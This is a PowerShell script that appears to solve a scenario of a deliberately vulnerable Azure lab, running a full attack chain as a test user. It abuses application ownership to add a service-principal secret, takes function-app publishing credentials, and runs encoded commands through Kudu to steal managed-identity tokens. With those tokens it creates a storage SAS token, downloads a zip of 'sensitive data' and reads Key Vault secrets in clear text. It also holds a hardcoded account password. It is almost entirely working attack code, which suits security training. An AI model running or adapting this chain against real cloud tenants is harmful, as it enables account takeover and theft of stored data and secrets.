This can be executed as a powershell script

#---------------------------------------------------

Disconnect-AzAccount
#------------------------------------------ConnectToAzureUser----------------------------------------------#
$us5Username = "us5@xmazuretestgmail.onmicrosoft.com"
$us5Password = "Hahahaha147222343!"
$SecurePassword = ConvertTo-SecureString $us5Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential -argumentlist $us5Username, $SecurePassword
Connect-AzureAD –Credential $Credential
#----------------Whoami-------------------#
((Get-AzContext).Account).ID

#-------------------------------------------ReconnaissanceUS5----------------------------------------------#

#------------CheckIfUS5ApplicationOwner------------#

$arrAppObjectId = @((Get-AzureADApplication).ObjectId)
foreach($objectId in $arrAppObjectId){Get-AzureADApplicationOwner -ObjectId $objectId | Where-Object{$_.DisplayName -eq "us5"}}

#-------------------------------------------ReconnaissanceScenario5App----------------------------------------------#
$scenario5ObjectID = (Get-AzureADApplication -SearchString scenarioapp6).ObjectId
$scenario5AppID = (Get-AzureADApplication -SearchString scenarioapp6).AppId


$appObjectID = (Get-AzureADApplication -SearchString scenarioapp6).ObjectID
$app = Get-AzureADApplication -ObjectId $appObjectID
$app.requiredResourceAccess | ConvertTo-Json -Depth 3

$scenario5Role = (($app.requiredResourceAccess | ConvertTo-Json -Depth 3).split(":")[3].split('"')[1]).trim()

$scenario5SP = Get-AzureADServicePrincipal -All $true | Where-Object {$_.AppId -eq '00000003-0000-0000-c000-000000000000'}
$scenario5SP.AppRoles | Where-Object {$_.Id -eq $scenario5Role}

#---------------------------------UseOwnerPrivilegeToConnectServicePrincapl--------------------------------#
Try{
$AppPassword = New-AzureADApplicationPasswordCredential -ObjectID $scenario5ObjectID
Start-Sleep -s 5
}
catch{
exit
}
Start-Sleep -s 20
$TenantID = (Get-AzureADTenantDetail).ObjectId

Write-Host "[+] Disconnect FROM AZURE"
Disconnect-AzAccount
$scenario5Token = $null


#----------------ConnectToServicePrincpal-------------------#

$AzureApplicationID =$scenario5AppID
$AzureTenantID = $TenantID
$AzurePassword = ConvertTo-SecureString $AppPassword.value -AsPlainText -Force
$psCred = (New-Object System.Management.Automation.PSCredential($AzureApplicationID, $AzurePassword))
Start-Sleep -s 20
Write-Host "[+] Connect To Service Principal"

Try{

    Connect-AzAccount -Credential $psCred -TenantID $AzureTenantID -ServicePrincipal
}
Catch{
Write-output "Could not connect to Azure"
exit
}

#Get SP Token
Start-Sleep -s 20
$APSUser = Get-AzContext *>&1
$resource = "https://management.azure.com"
$scenario5Token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate(`
$APSUser.Account, `
$APSUser.Environment, `
$APSUser.Tenant.Id.ToString(), `
$null, `
[Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, `
$null, `
$resource).AccessToken

$arr = @("SubscriptionId","ResourceGroupName","Name")
$uriParam = [System.Collections.ArrayList]::new()
foreach($param in $arr){$uriParam.add(((Get-AzFunctionApp)|Where-Object{$_.Name -cmatch "sc5"}).$($param))}


#-------------------------------------------PublishNewUsertoSCM----------------------------------------------#

#Microsoft.Web/sites/publishxml/Action
$method = "POST"
$URI = "https://management.azure.com:443/subscriptions/$($uriParam[0])/resourceGroups/$($uriParam[1])/providers/Microsoft.Web/sites/$($uriParam[2])/publishxml?api-version=2022-03-01"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "management.azure.com")
$headers.Add("Accept", "text/html,application/xhtml+xml")
$headers.Add("Authorization", "Bearer  $($scenario5Token)")
$contentType = [System.String]::new("application/x-www-form-urlencoded")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -Body $URIParams)
$userSCM = ($response.Content).split('"')[9]
$passwordSCM = ($response.Content).split('"')[11]

Write-Host "[+] UserName : $($userSCM)"
Write-Host "[+] Password : $($passwordSCM)"



#----------------ReconForID5-------------------#

#Get ID5 Client ID
$id5ClientID = (Get-AzUserAssignedIdentity -Name id5 -ResourceGroupName sc5).ClientId

#---------------------------------ExecuteCommandKuduGetID5Token----------------------------------------------#

$base64AuthInfo = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1}" -f $userSCM,$passwordSCM)))
$GeTokenPayload = '$headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER};$ClientId ="0de890fb-8bd4-42f3-9de7-5b236df07468";$ProgressPreference = "SilentlyContinue";$response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://management.azure.com&client_id=$ClientId&api-version=2019-08-01" -Headers $headers;$response.RawContent'
$Encoded64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($GeTokenPayload))
$method = "POST"
$URI = "https://sc5-windows-function-app.scm.azurewebsites.net:443/api/command"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "sc5-windows-function-app.scm.azurewebsites.net")
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
$headers.Add("Authorization", "Basic $($base64AuthInfo)")
$contentType = "application/json"
$body = "{
`"command`":`"powershell -EncodedCommand $($Encoded64)`",
`"dir`":`"C:\\home`"
}
"
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -Body $body)
$id5Token = (($response.Content).Split('"')[6]).split("\")



#---------------------------------ListingAllThestorageAccounts----------------------------------------------#
$method = "GET"
$URI = "https://management.azure.com:443/subscriptions/e60ae2a9-4b11-47ee-8fd8-dc708ca53dae/providers/Microsoft.Storage/storageAccounts?api-version=2022-09-01"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "management.azure.com")
$headers.Add("Referer", "https://learn.microsoft.com/")
$headers.Add("Authorization", "Bearer $($id5Token)")
$headers.Add("Origin", "https://learn.microsoft.com")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -UserAgent $userAgent -Body $URIParams)

#Look For XMGOAT5
$response.RawContent


#----------------CreateSASTokenInordertoGetAccesssToBlob-------------------#

$method = "POST"
$URI = "https://management.azure.com:443/subscriptions/$($uriParam[0])/resourceGroups/$($uriParam[1])/providers/Microsoft.Storage/storageAccounts/xmgoat5/ListAccountSas?api-version=2022-09-01"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "management.azure.com")
$headers.Add("Referer", "https://learn.microsoft.com/")
$contentType = "application/json"
$headers.Add("Authorization", "Bearer $($id5Token)")
$headers.Add("Origin", "https://learn.microsoft.com")
$body = "{
signedExpiry: `"2024-07-10T14:34:31.9776110Z`",
signedPermission: `"wrdlacup`",
signedResourceTypes: `"cso`",
signedServices: `"bqtf`"

}"
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -Body $body, $URIParams)
$SAStoken = $response.content.split(':')[1].split('"')[1]


#----------------ListContainers-------------------#

$method = "GET"
$URI = "https://xmgoat5.blob.core.windows.net:443/?comp=list&$($SAStoken)"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "xmgoat5.blob.core.windows.net")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers)
$data = $response.Content

#Container Name
$Container = [Regex]::Match( $data, '(?s)<Name>(\w*-\w*)</Name>' ).Groups.Value[1]



#----------------ListBlob-------------------#

$method = "GET"
$URI = "https://xmgoat5.blob.core.windows.net:443/$($Container)?restype=container&comp=list&$($SAStoken)"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "xmgoat5.blob.core.windows.net")

$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers)
$blobName = [Regex]::Match( $response.Content,'(?s)<Name>(\w.*)</Name>').Groups.Value[1]


#----------------DownloadBlob-------------------#

$method = "GET"
$URI = "https://xmgoat5.blob.core.windows.net:443/$($Container)/$($blobName)?$($SAStoken)"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "xmgoat5.blob.core.windows.net")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers)

Set-Content "SensitiveData.zip" -Value $response.Content -Encoding Byte


#----------------GetTokenForVaultAzureNet-------------------#

#Get Token for kv5zur555.vault.azure.net
$base64AuthInfo = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1}" -f $userSCM,$passwordSCM)))
$GeTokenPayload = '$headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER};$ClientId ="0de890fb-8bd4-42f3-9de7-5b236df07468";$ProgressPreference = "SilentlyContinue";$response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://vault.azure.net&client_id=$ClientId&api-version=2019-08-01" -Headers $headers;$response.RawContent'
$Encoded64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($GeTokenPayload))
$method = "POST"
$URI = "https://sc5-windows-function-app.scm.azurewebsites.net:443/api/command"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "sc5-windows-function-app.scm.azurewebsites.net")
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
$headers.Add("Authorization", "Basic $($base64AuthInfo)")
$contentType = "application/json"
$body = "{
`"command`":`"powershell -EncodedCommand $($Encoded64)`",
`"dir`":`"C:\\home`"
}
"
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -Body $body)
$id5VaultAzureNetToken = (($response.Content).Split('"')[6]).split("\")


#----------------GetSecrets-------------------#

$method = "GET"
$URI = "https://kv5zur555.vault.azure.net:443/secrets?api-version=7.3"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "kv5zur555.vault.azure.net")
$headers.Add("Accept", "text/html,application/xhtml+xml")
$headers.Add("Authorization", "Bearer $($id5VaultAzureNetToken)")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -UserAgent $userAgent -Body $URIParams)
$uriWsecre = ([Regex]::Match( $response.Content,'(?s)https(://.*)').Groups.Value).split('"')[0]


#----------------GetSecretsVersion-------------------#

$method = "GET"
$URI = "$($uriWsecre)/versions?api-version=7.3"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "kv5zur555.vault.azure.net")
$headers.Add("Accept", "text/html,application/xhtml+xml")
$headers.Add("Authorization", "Bearer $($id5VaultAzureNetToken)")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -UserAgent $userAgent -Body $URIParams)
$response.Content
$uriWsecreVersion = ([Regex]::Match( $response.Content,'(?s)https(://.*)').Groups.Value).split('"')[0]

#----------------GetSecretsClearText-------------------#

$method = "GET"
$URI = "$($uriWsecreVersion)?api-version=7.3"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "kv5zur555.vault.azure.net")
$headers.Add("Accept", "text/html,application/xhtml+xml")
$headers.Add("Authorization", "Bearer $($id5VaultAzureNetToken)")
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -UserAgent $userAgent -Body $URIParams)

#Get the Clear-Text Password for the ZIP file
$clearTextSecrets = ([Regex]::Match( $response.Content,'(?s)"value":(.*)').Groups.Value[0]).split(",")[0].split(":")[1].split('"')[1]


Write-host " [+] OPEN THE ZIP FILE WITH THE Following PASSWORD: $($clearTextSecrets)"  